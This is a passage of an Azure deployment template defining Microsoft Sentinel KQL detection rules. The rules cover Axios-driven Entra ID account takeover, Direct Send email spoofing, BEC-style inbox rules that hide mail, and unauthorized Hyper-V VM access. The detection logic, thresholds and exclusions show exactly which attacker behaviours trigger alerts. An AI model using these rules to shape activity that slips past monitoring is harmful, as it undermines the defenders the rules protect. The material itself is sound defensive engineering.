dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n}; \n let bv_SIL = bv_1935_sil(starttime=ago(latency + start_time), endtime=end_time);\n let bv_CloudAppEvents = bv_1935_cae(starttime=ago(latency + start_time), endtime=end_time);\n let bv_adfsSignInLogs = bv_1935_adfs(starttime=ago(latency + start_time), endtime=end_time);\n let bv_aadUserRiskEvents = bv_1935_aad_risk(starttime=ago(latency + start_time), endtime=end_time);\n bv_SIL\n | join kind=leftouter (bv_aadUserRiskEvents) on UserPrincipalName\n | join kind=leftouter (bv_adfsSignInLogs) on UserPrincipalName\n | join kind=leftouter (bv_CloudAppEvents) on $left.UserPrincipalName == $right.AccountDisplayName\n | extend ConsolidatedSeverity = case(\n    silSeverity == \"High\" or AlertSeverity == \"High\" or adfsAlertSeverity == \"High\" or caeAlertSeverity == \"High\", \"High\",\n    silSeverity == \"Medium\" or AlertSeverity == \"Medium\" or adfsAlertSeverity == \"Medium\" or caeAlertSeverity == \"Medium\", \"Medium\",\n    \"Low\"\n  ),\n  DataSources = strcat(\n    \"SigninLogs,\",\n    iif(isnotempty(UserId), \"AADUserRiskEvents,\", \"\"),\n    iif(isnotempty(UserId1), \"ADFSSignInLogs,\", \"\"),\n    iif(isnotempty(AccountObjectId), \"CloudAppEvents,\", \"\")\n  ),\n  CrossSourceRisk = case(\n    isnotempty(UserId) and isnotempty(AccountObjectId), \"Risk+PostCompromise\",\n    isnotempty(UserId1) and SuccessfulLogins > 0, \"ADFS+M365_Success\",\n    isnotempty(UserId), \"Risk_Events_Present\",\n    \"SigninLogs_Only\"\n  )\n | project\n   bv_dest_user = UserPrincipalName,\n   bv_user = UserPrincipalName,\n   bv_user_id = UserId,\n   bv_dest_user_display = UserDisplayName,\n   bv_start_time = coalesce(FirstSeen, FirstSeen2),\n   bv_end_time = coalesce(LastSeen, LastSeen2),\n   bv_http_user_agent = coalesce(SampleUserAgent, SampleUserAgent2),\n   bv_severity = ConsolidatedSeverity,\n   bv_data_sources = DataSources,\n   bv_attack_stage = CrossSourceRisk,\n   bv_total_events = coalesce(EventCount, 0) + coalesce(EventCount2, 0),\n   bv_axios_versions = array_sort_asc(array_concat(coalesce(AxiosVersions, dynamic([])), coalesce(AxiosVersions2, dynamic([])))),\n   bv_src_ip = array_sort_asc(array_concat(coalesce(IPs, dynamic([])), coalesce(IPs2, dynamic([])))),\n   bv_correlation_ids = array_sort_asc(array_concat(coalesce(CorrelationIds, dynamic([])), coalesce(CorrelationIds2, dynamic([])))),\n   bv_signin_successful = coalesce(SuccessfulLogins, 0),\n   bv_signin_failed = coalesce(FailedLogins, 0),\n   bv_signin_apps = Apps,\n   bv_signin_locations = Locations,\n   bv_adfs_successful = coalesce(SuccessfulAuths, 0),\n   bv_adfs_failed = coalesce(FailedAuths, 0),\n   bv_risk_active = coalesce(ActiveRisks, 0),\n   bv_risk_types = RiskTypes,\n   bv_risk_high_events = coalesce(HighRiskEvents, 0),\n   bv_sourcetype = Type\n   | summarize arg_max(bv_start_time, *), bv_event_count = count() by bv_user_id, bv_sourcetype\n       | invoke match(exclusions, 'exclusion')\n       | where match_status != 'exclusion'\n       | invoke description(excluded_description_fields, 300, 5)\n       | extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n           , bv_dedup_hash = hash_sha1(bv_user)\n       | where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash    \n | extend bv_alarm_victim_entities = pack_array(bv_user),\n   bv_alarm_attacker_entities = pack_array(bv_src_ip),\n   bv_src_ip1 = bv_src_ip[0], bv_src_ip2 = bv_src_ip[1], bv_src_ip3 = bv_src_ip[2]\n | extend ExtendedDescription = strcat(\n     \"At this time we would recommend investigating the user \",\n     bv_dest_user, \" (\", bv_dest_user_display, \") as it was determined that the user has been seen interacting with the \",\n     bv_http_user_agent, \". At this time we would recommend investigating the tables: \", bv_data_sources, '\\n\\n', ExtendedDescription)\n | project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CredentialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1110",
            "T1557"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1935: [SOC] EntraID - Suspected Axios Based Account Takeover for {{bv_user}}",
            "alertDescriptionFormat": "{{ExtendedDescription}}\n\nMITRE: T1078 MITRE: T1110 MITRE: T1557\ntag: SOC"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                },
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user_display"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip2"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip3"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-111111111')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-111111111')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-111111111: [Preview] Function Push",
          "description": "Used to push updates to the new BVIM parsers MITRE: T1562 Category: BVIM tag: Preview",
          "severity": "Informational",
          "enabled": false,
          "query": "bvim(ago(10m),now(),'no')                      \n| project-keep bv_*                \n| limit 1           ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Used to push updates to the new BVIM parsers  \n\ntag: Preview\n\nCategory:BVIM\n\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11525')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11525')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11525: [RBA] Defender - Anomalous Inbound Emails Potentially Related To Microsoft Direct Send Exploit",
          "description": "This detection identifies suspicious email traffic leveraging Microsoft Direct Send, focusing on authentication discrepancies between sender domains and originating IPs. It monitors for emails where Direct Send is used to bypass normal SPF/DKIM verification while maintaining sender legitimacy appearance, particularly targeting previously unused Direct Send configurations or unexpected sender patterns. MITRE: T1566,T1534,T1078 Category: DefenderXDR/Microsoft Defender XDR tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-11525';\nlet alert_type = 'RBA';\nlet exclude_hash = true;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet end_time = now();\nlet start_time = 15m;\nlet start_time_suppress = 1d;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])\n    , 'RBASCORE': 2\n    , 'excluded_dedup_hash_fields': dynamic(['bv_alert_category'])      \n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11525_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11525_CONFIG['RBASCORE']),real(1.0));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};  \nEmailEvents\n| where TimeGenerated between (ago(start_time) .. end_time)  \n|where EmailDirection == 'Inbound'\n|where strlen(Connectors) < 1 and tolower(RecipientEmailAddress) == tolower(SenderFromAddress)\n| extend bv_compositeauthentication = tostring(parse_json(AuthenticationDetails).CompAuth)\n    , bv_dkim = tostring(parse_json(AuthenticationDetails).DKIM)\n    , bv_dmarc = tostring(parse_json(AuthenticationDetails).DMARC)\n    , bv_spf = tostring(parse_json(AuthenticationDetails).SPF)\n    , bv_email_action = strcat(EmailAction,'-', OrgLevelAction,'-',DeliveryAction)\n| where  strlen(bv_spf) > 1 and isempty(OrgLevelPolicy)\n| where bv_compositeauthentication != 'pass' and bv_dmarc != 'pass' and bv_spf != 'pass' and tolower(bv_email_action) matches regex 'junk|block' == false\n| summarize bv_start_time = min(TimeGenerated), bv_end_time = arg_max(TimeGenerated, *), bv_event_count = count() by bv_sender = SenderFromAddress\n| project-rename bv_detection_methods = DetectionMethods\n        , bv_confidence_level = ConfidenceLevel\n        , bv_subject = Subject\n        , bv_connector = Connectors\n        , bv_sender_name = SenderDisplayName\n        , bv_recipient = RecipientEmailAddress\n        , bv_sender_domain = SenderFromDomain\n        , bv_threat_name = ThreatNames\n        , bv_threat_classification = ThreatClassification\n        , bv_threat_type = ThreatTypes\n        , bv_message_id = NetworkMessageId\n        , bv_attachment_cnt = AttachmentCount\n        , bv_src_ip = SenderIPv4\n| project-keep bv_*\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n    , bv_dedup_hash = hash_sha1(bv_sender)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash              \n| extend \n    bv_alarm_victim_entities = bv_recipient       \n| project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT15M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "LateralMovement",
            "Persistence",
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1566",
            "T1534",
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11525: [RBA] Defender - Anomalous Inbound Emails Potentially Related To Microsoft Direct Send Exploit To {{bv_recipient}}",
            "alertDescriptionFormat": "This detection identifies suspicious email traffic leveraging Microsoft Direct Send, focusing on authentication discrepancies between sender domains and originating IPs. It monitors for emails where Direct Send is used to bypass normal SPF/DKIM verification while maintaining sender legitimacy appearance, particularly targeting previously unused Direct Send configurations or unexpected sender patterns.\n\n{{ExtendedDescription}}\n\ntag: RBA\nMITRE: T1566 MITRE: T1534 MITRE: T1078"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_recipient"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-101')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-101')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-101: [SOC] O365 - Potential BEC Inbox Rule Created",
          "description": "Identifies when Office 365 Inbox Rules are created that is a potential BEC MITRE: T1114 Category: DefenderXDR,Microsoft Defender XDR tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 15m;\nlet end_time = now();\nlet latency = 30m;\nlet alert_id = 'BV-101:';\nlet start_time_suppress = 8h;\nlet global_config = dynamic({\n  'RBASCORE': 0\n});\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV101_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};      \nOfficeActivity\n|where TimeGenerated between (ago(latency + start_time) .. end_time)\n| where Operation has 'InboxRule' and Operation !has 'disable'\n| extend bv_object_attr = parse_json(Parameters)\n| mv-apply p= bv_object_attr on\n    (\n    extend FolderName = iff(p.Name == 'MoveToFolder' and isnotempty(p.Value), p.Value, '')\n    | extend RuleName = iff(p.Name == 'Name' and isnotempty(p.Value), p.Value, '')\n    | summarize\n        bv_folder_name = make_set_if(FolderName, isnotempty(FolderName)),\n        bv_rule_name = make_set_if(RuleName, isnotempty(RuleName))\n    )      \n| where bv_folder_name[0] has_any ('RSS', 'Conversation History') or (bv_rule_name[0] matches regex @'^[^\\w\\s-]+' and strlen(bv_rule_name[0]) <= 5) or (bv_folder_name[0] has 'Archive' and Parameters has '{\"Name\":\"MarkAsRead\",\"Value\":\"True\"}' and strlen(bv_rule_name[0]) <= 5)\nor (bv_folder_name[0] has 'Deleted Items' and not(bv_rule_name[0] has_any ('Move all messages', 'For all messages')) and array_length(split(bv_rule_name[0], ' ')) <= 2)\n| summarize arg_max(TimeGenerated, *) by UserId         \n| extend \n      bv_start_time = Start_Time\n      , bv_alert_time = TimeGenerated\n      , bv_alarm_time = now()\n      , bv_src_user = UserId\n      , bv_src_ip = ClientIP\n      , bv_object = OfficeObjectId\n      , bv_object_category = 'email'\n      , bv_object_attr_category = 'rule'\n      , bv_mitre_id = 'T1114'\n| parse bv_src_user with bv_src_user_name '@' bv_src_user_domain\n| extend VictimEntity = pack_array(bv_src_user_name)\n      , bv_dedup_hash = hash_sha1(bv_src_user_name)\n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash       \n| extend ExtendedDescription = strcat(\n  'bv_start_time: ', bv_start_time, '\\n' \n  , 'bv_alert_time: ', bv_alert_time, '\\n'               \n  , 'bv_src_user: ', bv_src_user, '\\n' \n  , 'bv_src_ip: ', bv_src_ip, '\\n' \n  , 'bv_object: ', bv_object, '\\n' \n  , 'bv_object_attr: \\n* ', strcat_array(bv_object_attr, '\\n* '))\n| project-keep\n      bv_*\n      , VictimEntity\n      , ExtendedDescription",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT8H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-101: [SOC] O365 - Potential BEC Via Creation of New Inbox Rule by {{bv_src_user}}",
            "alertDescriptionFormat": "Identifies when Office 365 Inbox Rules are created that is a potential BEC\n\n{{ExtendedDescription}}\n\nMITRE: T1114\nCategory: Office 365\ntag: SOC         "
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11602')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11602')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11602: [RBA] Defender - Suspicious VM Use",
          "description": "This detection identifies the use of suspicious virtual machines, including previously unobserved ones, consistent with known adversary tactics that leverage VMs as an evasion technique to avoid security controls and monitoring. MITRE: T1564,T1578,T1610,T1497,T1553,T1584 Category: DefenderXDR,Microsoft Defender XDR tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-11602';\nlet alert_type = 'RBA';\nlet exclude_hash = true;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet end_time = now();\nlet start_time = 1h;\nlet start_time_historical = 14d;\nlet start_time_suppress = 1d;\nlet alert_bin = 1h;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])     \n});\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSION'], BV11602_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip']));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11602_CONFIG['RBASCORE']),real(1.0));\nlet match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};  \nlet DeviceEvents_ = materialize(union isfuzzy=true\n(DeviceFileEvents\n| where TimeGenerated between (ago(start_time_historical) .. end_time)\n| where ActionType == 'FileCreated'\n| where isnotempty(InitiatingProcessCommandLine) and InitiatingProcessCommandLine has 'vmconnect.exe'\n| where tolower(RequestAccountName) matches regex tolower(AUTHORIZED_ADMINS) == false\n| project bv_start_time = TimeGenerated, bv_process_command_line = InitiatingProcessCommandLine, bv_dest_user=RequestAccountName, bv_src_dvc=DeviceName, bv_sourcetype = Type\n| extend new_cmd = replace_regex(bv_process_command_line, @'\"\\s|\\s\"', '\"_|_')\n| extend new_sp = split(new_cmd, '_|_')\n| extend bv_hyperv_server = replace_string(tostring(new_sp[1]), '\"', '')\n, bv_dest_dvc = replace_string(tostring(new_sp[2]), '\"', '')\n| project-keep bv_*\n),\n(DeviceProcessEvents\n| where TimeGenerated between (ago(start_time_historical) .. end_time)\n| where ActionType == 'ProcessCreated'\n| where InitiatingProcessCommandLine has_all ('mmc.exe', 'virtmgmt.msc')\n| where ProcessCommandLine has 'vmconnect.exe'\n| where tolower(AccountName) matches regex tolower(AUTHORIZED_ADMINS) == false\n| project bv_start_time = TimeGenerated, bv_process_command_line = ProcessCommandLine, bv_src_dvc=DeviceName, bv_dest_user=AccountName, bv_sourcetype = Type\n| extend new_cmd = replace_regex(bv_process_command_line, @'\"\\s|\\s\"', '\"_|_')\n| extend new_sp = split(new_cmd, '_|_')\n| extend bv_hyperv_server = replace_string(tostring(new_sp[1]), '\"', '')\n, bv_dest_dvc = replace_string(tostring(new_sp[2]), '\"', '')\n| project-keep bv_*\n));\nDeviceEvents_\n| where bv_start_time <= ago(alert_bin)\n| join kind=rightanti \n(DeviceEvents_\n| where bv_start_time > ago(alert_bin)\n) on bv_dest_dvc\n| summarize           \n        bv_event_count = count()\n          , bv_start_time = min(bv_start_time)\n          , bv_end_time = max(bv_start_time)\n          , bv_process_command_line = make_set(bv_process_command_line, 10)  \n          , bv_hyperv_server = make_set(bv_hyperv_server, 10)   \n          , bv_src_dvc = make_set(bv_src_dvc, 10)\n          , bv_dest_dvc = make_set(tolower(bv_dest_dvc), 10)\n          , bv_sourcetype = make_set(bv_sourcetype, 10)\n          by bv_user = tolower(bv_dest_user)\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'\n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n    , bv_dedup_hash = hash_sha1(bv_user)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash              \n| extend \n    bv_alarm_attacker_entities = bv_src_dvc\n    , bv_alarm_victim_entities = array_concat(bv_dest_dvc, pack_array(bv_user))\n    , bv_src_dvc1 = bv_src_dvc[0]\n    , bv_dest_dvc1 = bv_dest_dvc[0]\n    , bv_mapping_tag = bv_user\n| project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Execution",
            "Discovery",
            "ResourceDevelopment"
          ],
          "techniques": [
            "T1564",
            "T1578",
            "T1610",
            "T1497",
            "T1553",
            "T1584"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11602: [RBA] Defender - Suspicious VM Use {{bv_dest_dvc1}} by {{bv_user}}",
